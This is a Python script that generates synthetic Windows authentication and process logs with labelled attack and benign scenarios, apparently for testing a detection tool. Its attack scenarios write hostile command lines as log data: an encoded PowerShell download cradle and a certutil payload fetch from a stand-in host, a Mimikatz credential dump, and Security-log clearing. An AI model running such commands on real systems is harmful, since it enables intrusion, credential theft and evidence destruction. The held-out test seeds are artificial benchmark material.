"""Synthetic Windows-style security log generator with ground truth.

Produces realistic authentication (4624/4625/4634/4672/4728/4732) and endpoint (4688/1102)
activity for a small organisation, plus labelled attack scenarios and benign look-alikes.

Labels are written to separate files (ground_truth.json, labels.csv) and never appear in the
log files the detector reads.

Usage:
    python data/generator.py                 # writes dev + test datasets to data/samples/
    python data/generator.py --seed 7 --name dev_seed7
"""
from __future__ import annotations

import argparse
import base64
import csv
import json
import random
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta
from pathlib import Path

OUT_DIR = Path(__file__).resolve().parent / "samples"

FIRST = ["arjun", "priya", "rahul", "sneha", "vikram", "ananya", "karthik", "meera", "rohan", "divya",
         "suresh", "kavya", "aditya", "nisha", "manoj", "pooja", "sanjay", "lakshmi", "deepak", "swati",
         "harish", "neha", "gaurav", "isha", "naveen", "ritu", "ajay", "shalini", "varun", "tara"]
LAST = ["sharma", "iyer", "reddy", "nair", "rao", "mehta", "gupta", "pillai", "das", "joshi", "kumar",
        "menon", "bose", "shetty", "verma", "kulkarni"]
DEPTS = ["FIN", "HR", "ENG", "SALES", "OPS"]
SERVERS = {"DC01": "10.0.10.10", "FS01": "10.0.10.11", "SQL01": "10.0.10.12",
           "FIN-SRV01": "10.0.10.13", "BKP01": "10.0.10.15", "MON01": "10.0.10.16"}
EXTERNAL_PREFIXES = ["203.0.113.", "198.51.100.", "192.0.2.", "185.220.101.", "45.155.205."]

NORMAL_APPS = [("chrome.exe", "explorer.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"'),
               ("outlook.exe", "explorer.exe", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'),
               ("teams.exe", "explorer.exe", '"C:\\Users\\Public\\Teams\\current\\Teams.exe"'),
               ("excel.exe", "explorer.exe", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"'),
               ("winword.exe", "explorer.exe", '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"'),
               ("msedge.exe", "explorer.exe", '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"'),
               ("notepad.exe", "explorer.exe", "notepad.exe"),
               ("splwow64.exe", "winword.exe", "C:\\Windows\\splwow64.exe 12288"),
               ("cmd.exe", "explorer.exe", "cmd.exe /c dir C:\\Users"),
               ("onedrive.exe", "explorer.exe", '"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background')]
ADMIN_CMDS = ['powershell.exe -NoProfile -Command "Get-Service | Where-Object Status -eq Stopped"',
              "cmd.exe /c ipconfig /all", "mmc.exe C:\\Windows\\system32\\dsa.msc",
              "powershell.exe -NoProfile -File C:\\Scripts\\health_check.ps1",
              'cmd.exe /c net user /domain', "C:\\Windows\\system32\\gpmc.msc"]


@dataclass
class GenParams:
    seed: int
    name: str
    start: str = "2026-11-02"        # will be moved to the Monday of that week
    days: int = 7
    n_regular: int = 20
    n_workstations: int = 12
    bf_failures: tuple = (12, 25)
    bf_duration_min: tuple = (2, 6)
    spray_users: tuple = (7, 12)
    spray_duration_min: tuple = (3, 9)
    spray_success_prob: float = 0.0
    success_delay_min: tuple = (1, 8)
    step_gap_min: tuple = (3, 15)
    s5_hour: tuple = (1, 4)
    description: str = ""


DEV = GenParams(seed=7, name="dev_seed7", start="2026-11-02",
                description="Development seed: used for threshold tuning only.")
TEST = [
    GenParams(seed=101, name="test_seed101", start="2026-10-12", n_regular=22, n_workstations=13,
              bf_failures=(9, 30), bf_duration_min=(1, 9), spray_users=(5, 14), spray_success_prob=1.0,
              success_delay_min=(1, 12), step_gap_min=(2, 20), s5_hour=(0, 5),
              description="Held-out test seed: different users, faster/slower attacks, spray with one success."),
    GenParams(seed=202, name="test_seed202", start="2026-11-09", n_regular=18, n_workstations=11,
              bf_failures=(8, 40), bf_duration_min=(3, 12), spray_users=(5, 9), spray_duration_min=(4, 14),
              spray_success_prob=0.0, success_delay_min=(2, 14), step_gap_min=(5, 25), s5_hour=(1, 3),
              description="Held-out test seed: slower brute force (some below the R1 density threshold)."),
    GenParams(seed=303, name="test_seed303", start="2026-11-16", n_regular=24, n_workstations=14,
              bf_failures=(10, 20), bf_duration_min=(1, 4), spray_users=(6, 15), spray_duration_min=(2, 6),
              spray_success_prob=0.5, success_delay_min=(1, 5), step_gap_min=(1, 10), s5_hour=(2, 5),
              description="Held-out test seed: larger organisation, fast attack chains."),
]


def stress_params(n: int = 10, base_seed: int = 1000) -> list[GenParams]:
    """Wider, partly out-of-envelope attack parameters (slow brute force, small sprays, long gaps).

    Created after the detector was frozen and never used for tuning; expected to produce misses.
    """
    rr = random.Random(base_seed)
    out = []
    for i in range(n):
        lo_bf = rr.randint(5, 10)
        out.append(GenParams(
            seed=base_seed + i + 1, name=f"stress_seed{base_seed + i + 1}",
            start=(datetime(2026, 9, 7) + timedelta(weeks=i)).strftime("%Y-%m-%d"),
            n_regular=rr.randint(18, 26), n_workstations=rr.randint(10, 15),
            bf_failures=(lo_bf, lo_bf + rr.randint(2, 20)), bf_duration_min=(1, rr.randint(5, 35)),
            spray_users=(rr.randint(3, 6), rr.randint(6, 12)), spray_duration_min=(2, rr.randint(5, 25)),
            spray_success_prob=rr.random(), success_delay_min=(1, rr.randint(5, 25)),
            step_gap_min=(1, rr.randint(10, 45)), s5_hour=(0, 5),
            description="Stress seed: out-of-envelope attack speeds and sizes."))
    return out


STRESS = stress_params()


@dataclass
class Account:
    name: str
    kind: str            # regular | nightshift | admin | service
    dept: str
    ws: str
    ip: str
    start_h: float = 9.0
    hours: float = 8.5


class Generator:
    def __init__(self, p: GenParams):
        self.p = p
        self.r = random.Random(p.seed)
        d = datetime.fromisoformat(p.start)
        self.t0 = (d - timedelta(days=d.weekday())).replace(hour=0, minute=0, second=0)
        self.records: list[dict] = []
        self.scenarios: dict[str, dict] = {}
        self._uid = 0
        self._build_org()

    # ------------------------------------------------------------------ organisation
    def _build_org(self):
        r = self.r
        names = set()
        while len(names) < self.p.n_regular:
            names.add(f"{r.choice(FIRST)}.{r.choice(LAST)}")
        names = sorted(names)
        r.shuffle(names)
        self.workstations = {}
        for i in range(self.p.n_workstations):
            dept = DEPTS[i % len(DEPTS)]
            ws = f"WS-{dept}-{i + 1:02d}"
            self.workstations[ws] = (dept, f"10.0.{DEPTS.index(dept) + 1}.{20 + i}")
        ws_list = list(self.workstations)
        self.accounts: dict[str, Account] = {}
        for i, n in enumerate(names):
            ws = ws_list[i % len(ws_list)]
            dept, ip = self.workstations[ws]
            kind = "nightshift" if dept == "OPS" and i % 3 == 0 else "regular"
            start = r.uniform(19.5, 21.5) if kind == "nightshift" else r.uniform(7.5, 10.5)
            self.accounts[n] = Account(n, kind, dept, ws, ip, start, r.uniform(7.5, 9.5))
        for k, n in enumerate(["admin01", "admin02"]):
            ws = f"WS-IT-{k + 1:02d}"
            self.workstations[ws] = ("IT", f"10.0.9.{10 + k}")
            self.accounts[n] = Account(n, "admin", "IT", ws, f"10.0.9.{10 + k}", r.uniform(8, 9.5), 9)
        for n, srv in (("svc_backup", "BKP01"), ("svc_sql", "SQL01"), ("svc_monitor", "MON01")):
            self.accounts[n] = Account(n, "service", "IT", srv, SERVERS[srv], 0, 24)
        self.regulars = [a for a in self.accounts.values() if a.kind == "regular"]

    def ip_of(self, host):
        return SERVERS.get(host) or self.workstations.get(host, ("", ""))[1]

    # ------------------------------------------------------------------ record helpers
    def _add(self, rec: dict, scen: str | None, mal: bool):
        self._uid += 1
        rec["_uid"] = self._uid
        rec["_scen"] = scen or "normal"
        rec["_mal"] = mal
        self.records.append(rec)
        if scen:
            self.scenarios[scen]["uids"].append(self._uid)
        return rec

    def auth(self, ts, code, user, host, ip="", subject="-", member="", logon_type="", status="0x0",
             scen=None, mal=False):
        return self._add({"log": "auth", "ts": ts, "EventID": code, "Computer": host,
                          "TargetUserName": user, "SubjectUserName": subject, "MemberName": member,
                          "IpAddress": ip or "-", "LogonType": logon_type, "Status": status}, scen, mal)

    def logon(self, ts, user, host, ip, scen=None, mal=False, logon_type="2", priv=False):
        self.auth(ts, "4624", user, host, ip, logon_type=logon_type, scen=scen, mal=mal)
        if priv:
            self.auth(ts + timedelta(seconds=1), "4672", user, host, ip, subject=user, scen=scen, mal=mal)

    def fail(self, ts, user, host, ip, scen=None, mal=False):
        self.auth(ts, "4625", user, host, ip, logon_type="3", status="0xC000006A", scen=scen, mal=mal)

    def logoff(self, ts, user, host, scen=None, mal=False):
        self.auth(ts, "4634", user, host, "", scen=scen, mal=mal)

    def group_add(self, ts, actor, member, group, host, scen=None, mal=False, code="4732"):
        self.auth(ts, code, group, host, "", subject=actor,
                  member=f"CN={member},OU=Users,DC=corp,DC=local", status="0x0", scen=scen, mal=mal)

    def proc(self, ts, user, host, process, parent, cmd, scen=None, mal=False):
        return self._add({"log": "endpoint", "ts": ts, "EventID": "4688", "Computer": host, "user": user,
                          "process": process, "parent": parent, "cmd": cmd}, scen, mal)

    def log_clear(self, ts, user, host, scen=None, mal=False):
        return self._add({"log": "endpoint", "ts": ts, "EventID": "1102", "Computer": host, "user": user,
                          "process": "", "parent": "", "cmd": ""}, scen, mal)

    def scenario(self, sid, name, kind, expected=None, description=""):
        self.scenarios[sid] = {"scenario_id": sid, "name": name, "type": kind,
                               "expected_severity": expected, "description": description, "uids": []}
        return sid

    def at(self, day, hour):
        return self.t0 + timedelta(days=day, hours=hour)

    def jitter(self, ts, minutes):
        return ts + timedelta(seconds=self.r.randint(0, int(minutes * 60)))

    def in_change_window(self, ts):
        wd, h = ts.weekday(), ts.hour + ts.minute / 60
        return (wd == 5 and h >= 18) or (wd == 6 and h < 6)

    # ------------------------------------------------------------------ normal activity
    def normal(self):
        r = self.r
        for day in range(self.p.days):
            weekend = self.at(day, 0).weekday() >= 5
            for a in self.accounts.values():
                if a.kind == "service":
                    self._service_day(a, day)
                    continue
                if weekend and r.random() > 0.08:
                    continue
                start = self.at(day, a.start_h + r.uniform(-0.4, 0.4))
                end = start + timedelta(hours=(a.hours if not weekend else r.uniform(1, 2.5)))
                if r.random() < 0.06:  # occasional single typo
                    self.fail(start - timedelta(seconds=r.randint(5, 40)), a.name, a.ws, a.ip)
                self.logon(start, a.name, a.ws, a.ip)
                self.proc(start + timedelta(seconds=20), a.name, a.ws, "explorer.exe", "userinit.exe",
                          "C:\\Windows\\Explorer.EXE")
                n_srv = r.randint(1, 3)
                for _ in range(n_srv):
                    t = start + (end - start) * r.random()
                    srv = "FIN-SRV01" if a.dept == "FIN" and r.random() < 0.5 else "FS01"
                    self.logon(t, a.name, srv, a.ip, logon_type="3")
                for _ in range(r.randint(4, 9)):
                    t = start + (end - start) * r.random()
                    pname, parent, cmd = r.choice(NORMAL_APPS)
                    self.proc(t, a.name, a.ws, pname, parent, cmd)
                if a.kind == "admin":
                    for _ in range(r.randint(2, 4)):
                        t = start + (end - start) * r.random()
                        srv = r.choice(["DC01", "FS01", "SQL01", "FIN-SRV01", "BKP01"])
                        self.logon(t, a.name, srv, a.ip, logon_type="10", priv=True)
                        cmd = r.choice(ADMIN_CMDS)
                        self.proc(t + timedelta(minutes=r.randint(1, 10)), a.name, srv,
                                  cmd.split()[0].split("\\")[-1].lower(), "explorer.exe", cmd)
                self.logoff(end, a.name, a.ws)

    def _service_day(self, a, day):
        r = self.r
        if a.name == "svc_backup":
            t = self.at(day, 1 + r.uniform(0, 0.3))
            self.logon(t, a.name, "BKP01", SERVERS["BKP01"], logon_type="5", priv=True)
            self.logon(t + timedelta(minutes=2), a.name, "FS01", SERVERS["BKP01"], logon_type="3")
            self.proc(t + timedelta(minutes=3), a.name, "BKP01", "wbadmin.exe", "svchost.exe",
                      "wbadmin start backup -backupTarget:\\\\BKP01\\Backups -include:\\\\FS01\\Shares -quiet")
        elif a.name == "svc_sql":
            for h in (0, 6, 12, 18):
                t = self.at(day, h + r.uniform(0, 0.1))
                self.logon(t, a.name, "SQL01", SERVERS["SQL01"], logon_type="5", priv=True)
        else:
            for h in (2, 10, 18):
                t = self.at(day, h + r.uniform(0, 0.05))
                srv = r.choice(["DC01", "FS01", "SQL01"])
                self.logon(t, a.name, srv, SERVERS["MON01"], logon_type="3")

    # ------------------------------------------------------------------ attacks
    def attack_time(self, day, hour_range):
        for _ in range(50):
            t = self.at(day, self.r.uniform(*hour_range))
            if not self.in_change_window(t):
                return t
        return self.at(day, hour_range[0])

    def ext_ip(self):
        return self.r.choice(EXTERNAL_PREFIXES) + str(self.r.randint(2, 250))

    def s1_bruteforce_chain(self, victim, day):
        r, p = self.r, self.p
        sid = self.scenario("S1", "Brute force -> compromise -> privilege change -> suspicious PowerShell",
                            "malicious", "Critical",
                            f"Brute force against {victim.name} on {victim.ws}, successful logon, account added "
                            "to local Administrators, encoded PowerShell and certutil download.")
        ip = self.ext_ip()
        t = self.attack_time(day, (0, 23))
        n = r.randint(*p.bf_failures)
        dur = r.uniform(*p.bf_duration_min) * 60
        times = sorted(t + timedelta(seconds=r.uniform(0, dur)) for _ in range(n))
        for ts in times:
            self.fail(ts, victim.name, victim.ws, ip, sid, True)
        t = times[-1] + timedelta(minutes=r.uniform(*p.success_delay_min))
        self.logon(t, victim.name, victim.ws, ip, sid, True, logon_type="10")
        t += timedelta(minutes=r.uniform(*p.step_gap_min))
        self.group_add(t, victim.name, victim.name, "Administrators", victim.ws, sid, True, code="4732")
        t += timedelta(minutes=r.uniform(*p.step_gap_min))
        payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')"
                                   .encode("utf-16-le")).decode()
        self.proc(t, victim.name, victim.ws, "powershell.exe", "cmd.exe",
                  f"powershell.exe -nop -w hidden -enc {payload[:60]}", sid, True)
        t += timedelta(minutes=r.uniform(1, 5))
        self.proc(t, victim.name, victim.ws, "certutil.exe", "powershell.exe",
                  "certutil.exe -urlcache -split -f http://198.51.100.7/p.exe C:\\Users\\Public\\p.exe", sid, True)

    def s2_spray(self, day):
        r, p = self.r, self.p
        success = r.random() < p.spray_success_prob
        sid = self.scenario("S2", "Password spraying" + (" with one successful logon" if success else ""),
                            "malicious", "High" if success else "Medium",
                            "One external source tries a few passwords against many accounts on DC01.")
        ip = self.ext_ip()
        t = self.attack_time(day, (0, 23))
        pool = [a for a in self.accounts.values() if a.kind in ("regular", "nightshift", "admin")]
        targets = r.sample(pool, min(len(pool), r.randint(*p.spray_users)))
        dur = r.uniform(*p.spray_duration_min) * 60
        last = t
        for a in targets:
            for _ in range(r.randint(1, 2)):
                ts = t + timedelta(seconds=r.uniform(0, dur))
                last = max(last, ts)
                self.fail(ts, a.name, "DC01", ip, sid, True)
        if success:
            victim = r.choice([a for a in targets if a.kind != "admin"] or targets)
            self.logon(last + timedelta(minutes=r.uniform(*p.success_delay_min)), victim.name, "DC01", ip,
                       sid, True, logon_type="3")

    def s3_insider(self, insider, day):
        r, p = self.r, self.p
        sid = self.scenario("S3", "Unauthorised privileged group membership change (insider)", "malicious",
                            "High", f"Non-admin {insider.name} logs on to DC01 and adds themself to Domain Admins.")
        t = self.attack_time(day, (insider.start_h + 1, insider.start_h + 6))
        self.logon(t, insider.name, "DC01", insider.ip, sid, True, logon_type="10")
        t += timedelta(minutes=r.uniform(*p.step_gap_min))
        self.group_add(t, insider.name, insider.name, "Domain Admins", "DC01", sid, True, code="4728")
        t += timedelta(minutes=r.uniform(1, 6))
        self.proc(t, insider.name, "DC01", "net.exe", "cmd.exe", 'net group "Domain Admins" /domain', sid, True)

    def s4_process_logclear(self, day):
        r, p = self.r, self.p
        sid = self.scenario("S4", "Credential dumping followed by audit-log clearing", "malicious", "Critical",
                            "admin02 credentials used at night from an unknown internal host on FIN-SRV01; "
                            "Mimikatz executed and the Security log cleared.")
        ip = f"10.0.{r.randint(30, 60)}.{r.randint(2, 250)}"
        t = self.attack_time(day, (1.5, 4.5))
        self.logon(t, "admin02", "FIN-SRV01", ip, sid, True, logon_type="10", priv=True)
        t += timedelta(minutes=r.uniform(*p.step_gap_min))
        self.proc(t, "admin02", "FIN-SRV01", "mimikatz.exe", "cmd.exe",
                  'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', sid, True)
        t += timedelta(minutes=r.uniform(*p.step_gap_min))
        self.proc(t, "admin02", "FIN-SRV01", "wevtutil.exe", "cmd.exe", "wevtutil.exe cl Security", sid, True)
        self.log_clear(t + timedelta(seconds=1), "admin02", "FIN-SRV01", sid, True)

    def s5_offhours(self, victim, day):
        r, p = self.r, self.p
        sid = self.scenario("S5", "Off-hours logon from an unfamiliar device", "malicious", "Low",
                            f"{victim.name} authenticates at night from a never-seen address to FIN-SRV01 and FS01.")
        ip = f"10.0.{r.randint(61, 90)}.{r.randint(2, 250)}"
        t = self.attack_time(day, p.s5_hour)
        self.logon(t, victim.name, "FIN-SRV01", ip, sid, True, logon_type="3")
        t += timedelta(minutes=r.uniform(5, 20))
        self.logon(t, victim.name, "FS01", ip, sid, True, logon_type="3")

    # ------------------------------------------------------------------ benign look-alikes
    def benign(self, day_a, day_b, users):
        r = self.r
        sat = next(d for d in range(self.p.days) if self.at(d, 0).weekday() == 5)
        # B1 approved night maintenance by admin01 inside the change window
        sid = self.scenario("B1", "Approved night maintenance (admin01, change window)", "benign")
        t = self.at(sat, r.uniform(19.0, 21.0))
        a1 = self.accounts["admin01"]
        self.logon(t, "admin01", a1.ws, a1.ip, sid)
        self.logon(t + timedelta(minutes=3), "admin01", "SQL01", a1.ip, sid, logon_type="10", priv=True)
        self.proc(t + timedelta(minutes=5), "admin01", "SQL01", "powershell.exe", "explorer.exe",
                  "powershell.exe -NoProfile -File C:\\Scripts\\sql_maintenance.ps1", sid)
        self.proc(t + timedelta(minutes=9), "admin01", "SQL01", "net.exe", "powershell.exe",
                  "net stop MSSQLSERVER", sid)
        self.proc(t + timedelta(minutes=12), "admin01", "SQL01", "net.exe", "powershell.exe",
                  "net start MSSQLSERVER", sid)
        # B2 user mistypes password 2-3 times
        u = users[0]
        sid = self.scenario("B2", f"Password typed wrongly 2-3 times ({u.name})", "benign")
        t = self.at(day_a, u.start_h + r.uniform(2, 4))
        for i in range(r.randint(2, 3)):
            self.fail(t + timedelta(seconds=15 * i), u.name, u.ws, u.ip, sid)
        self.logon(t + timedelta(seconds=60), u.name, u.ws, u.ip, sid)
        # B3 new laptop rollout (new hosts + new IPs during business hours)
        sid = self.scenario("B3", "New laptop rollout", "benign")
        for i, u in enumerate(users[1:4]):
            t = self.at(day_b, u.start_h + r.uniform(1, 3))
            self.logon(t, u.name, f"LT-NEW-{i + 1:02d}", f"10.0.20.{30 + i}", sid)
            self.proc(t + timedelta(seconds=30), u.name, f"LT-NEW-{i + 1:02d}", "explorer.exe", "userinit.exe",
                      "C:\\Windows\\Explorer.EXE", sid)
        # B4 authorised group change in the change window
        sid = self.scenario("B4", "Approved group membership change (admin02, change window)", "benign")
        a2 = self.accounts["admin02"]
        t = self.at(sat, r.uniform(21.5, 23.0))
        self.logon(t, "admin02", "DC01", a2.ip, sid, logon_type="10", priv=True)
        self.group_add(t + timedelta(minutes=4), "admin02", users[4].name, "Backup Operators", "DC01", sid,
                       code="4728")
        # B5 legitimate IT admin script during the day
        sid = self.scenario("B5", "Legitimate administrator script (admin02)", "benign")
        t = self.at(day_a, a2.start_h + r.uniform(1, 5))
        self.proc(t, "admin02", a2.ws, "powershell.exe", "explorer.exe",
                  "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\\\FS01\\IT\\Scripts\\deploy_agent.ps1",
                  sid)
        self.proc(t + timedelta(minutes=2), "admin02", a2.ws, "cmd.exe", "powershell.exe",
                  "cmd.exe /c gpupdate /force", sid)
        # B6 forgotten password after a break: 5-7 failures then success from own device
        u = users[5]
        sid = self.scenario("B6", f"Forgotten password, several retries ({u.name})", "benign")
        t = self.at(day_b, u.start_h + r.uniform(0.2, 1))
        k = r.randint(5, 7)
        for i in range(k):
            self.fail(t + timedelta(seconds=25 * i + r.randint(0, 10)), u.name, u.ws, u.ip, sid)
        self.logon(t + timedelta(seconds=25 * k + 60), u.name, u.ws, u.ip, sid)
        # B7 normal service-account behaviour at night (scheduled backup)
        sid = self.scenario("B7", "Scheduled service-account backup at night (svc_backup)", "benign")
        t = self.at(day_a, 1.5 + r.uniform(0, 0.4))
        self.logon(t, "svc_backup", "BKP01", SERVERS["BKP01"], sid, logon_type="5", priv=True)
        self.proc(t + timedelta(minutes=1), "svc_backup", "BKP01", "wbadmin.exe", "svchost.exe",
                  "wbadmin start backup -backupTarget:\\\\BKP01\\Backups -include:\\\\FS01\\Shares -quiet", sid)

    # ------------------------------------------------------------------ run + write
    def run(self):
        r = self.r
        self.normal()
        day_users = [a for a in self.regulars]
        r.shuffle(day_users)
        fin = [a for a in day_users if a.dept == "FIN"] or day_users
        attack_days = [2, 3, 4]
        self.s1_bruteforce_chain(day_users[0], r.choice(attack_days))
        self.s2_spray(r.choice(attack_days))
        self.s3_insider(day_users[1], r.choice(attack_days))
        self.s4_process_logclear(r.choice(attack_days))
        s5_victim = next(a for a in fin if a not in day_users[:2])
        # Off-hours anomaly needs a behavioural baseline: it happens after >= 4 days of history.
        self.s5_offhours(s5_victim, 4)
        others = [a for a in day_users[2:] if a is not s5_victim]
        self.benign(3, 2, others)
        return self

    def write(self, out_dir: Path):
        out_dir.mkdir(parents=True, exist_ok=True)
        recs = sorted(self.records, key=lambda x: (x["ts"], x["_uid"]))
        uid_to_rid = {}
        for i, rec in enumerate(recs, start=1):
            rec["EventRecordID"] = 100000 + i
            uid_to_rid[rec["_uid"]] = rec["EventRecordID"]
        auth = [x for x in recs if x["log"] == "auth"]
        endp = [x for x in recs if x["log"] == "endpoint"]
        auth_cols = ["TimeCreated", "EventID", "EventRecordID", "Computer", "TargetUserName",
                     "SubjectUserName", "MemberName", "IpAddress", "LogonType", "Status", "Channel"]

        def auth_row(x, iso=False):
            return {"TimeCreated": x["ts"].strftime("%Y-%m-%dT%H:%M:%SZ" if iso else "%Y-%m-%d %H:%M:%S"),
                    "EventID": x["EventID"], "EventRecordID": x["EventRecordID"],
                    "Computer": x["Computer"].lower() + ".corp.local" if iso else x["Computer"],
                    "TargetUserName": x["TargetUserName"], "SubjectUserName": x["SubjectUserName"],
                    "MemberName": x["MemberName"], "IpAddress": x["IpAddress"], "LogonType": x["LogonType"],
                    "Status": x["Status"], "Channel": "Security"}

        with open(out_dir / "auth_logs.csv", "w", newline="", encoding="utf-8") as fh:
            w = csv.DictWriter(fh, fieldnames=auth_cols)
            w.writeheader()
            for x in auth:
                w.writerow(auth_row(x))
        with open(out_dir / "auth_logs.json", "w", encoding="utf-8") as fh:
            json.dump([auth_row(x, iso=True) for x in auth], fh, indent=1)

        def proc_path(p):
            if not p:
                return ""
            return p if "\\" in p else f"C:\\Windows\\System32\\{p}"

        with open(out_dir / "endpoint_logs.json", "w", encoding="utf-8") as fh:
            for x in endp:  # JSON-lines, nested (ECS-like)
                doc = {"@timestamp": x["ts"].strftime("%Y-%m-%dT%H:%M:%S.000Z"),
                       "event": {"code": x["EventID"], "record_id": x["EventRecordID"],
                                 "action": "process_created" if x["EventID"] == "4688" else "audit_log_cleared"},
                       "host": {"name": x["Computer"].lower() + ".corp.local"},
                       "user": {"name": "CORP\\" + x["user"]}}
                if x["EventID"] == "4688":
                    doc["process"] = {"name": x["process"], "executable": proc_path(x["process"]),
                                      "command_line": x["cmd"], "parent": {"name": x["parent"]}}
                fh.write(json.dumps(doc) + "\n")
        with open(out_dir / "endpoint_logs.csv", "w", newline="", encoding="utf-8") as fh:
            w = csv.DictWriter(fh, fieldnames=["TimeCreated", "EventID", "EventRecordID", "Computer",
                                               "SubjectUserName", "NewProcessName", "ParentProcessName",
                                               "CommandLine"])
            w.writeheader()
            for x in endp:
                w.writerow({"TimeCreated": x["ts"].strftime("%Y-%m-%d %H:%M:%S"), "EventID": x["EventID"],
                            "EventRecordID": x["EventRecordID"], "Computer": x["Computer"],
                            "SubjectUserName": x["user"], "NewProcessName": proc_path(x["process"]),
                            "ParentProcessName": proc_path(x["parent"]), "CommandLine": x["cmd"]})
        with open(out_dir / "labels.csv", "w", newline="", encoding="utf-8") as fh:
            w = csv.writer(fh)
            w.writerow(["EventRecordID", "scenario_id", "is_malicious"])
            for x in recs:
                w.writerow([x["EventRecordID"], x["_scen"], int(x["_mal"])])
        gt = {"dataset": self.p.name, "generator_params": {k: v for k, v in asdict(self.p).items()},
              "week_start": self.t0.strftime("%Y-%m-%d"), "events": len(recs),
              "auth_events": len(auth), "endpoint_events": len(endp),
              "accounts": len(self.accounts),
              "hosts": len({x["Computer"] for x in recs}),
              "incidents": [], "benign": []}
        for s in self.scenarios.values():
            entry = {k: v for k, v in s.items() if k != "uids"}
            entry["record_ids"] = sorted(uid_to_rid[u] for u in s["uids"])
            (gt["incidents"] if s["type"] == "malicious" else gt["benign"]).append(entry)
        with open(out_dir / "ground_truth.json", "w", encoding="utf-8") as fh:
            json.dump(gt, fh, indent=1, default=str)
        return gt


def generate(p: GenParams, out_root: Path = OUT_DIR) -> dict:
    g = Generator(p).run()
    return g.write(out_root / p.name)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int)
    ap.add_argument("--name")
    ap.add_argument("--out", default=str(OUT_DIR))
    a = ap.parse_args()
    out = Path(a.out)
    if a.seed is not None:
        gt = generate(GenParams(seed=a.seed, name=a.name or f"seed{a.seed}"), out)
        print(gt["dataset"], gt["events"], "events")
        return
    for p in [DEV, *TEST]:
        gt = generate(p, out)
        print(f"{gt['dataset']}: {gt['events']} events ({gt['auth_events']} auth, {gt['endpoint_events']} "
              f"endpoint), {gt['accounts']} accounts, {gt['hosts']} hosts, {len(gt['incidents'])} attacks, "
              f"{len(gt['benign'])} benign look-alikes")


if __name__ == "__main__":
    main()
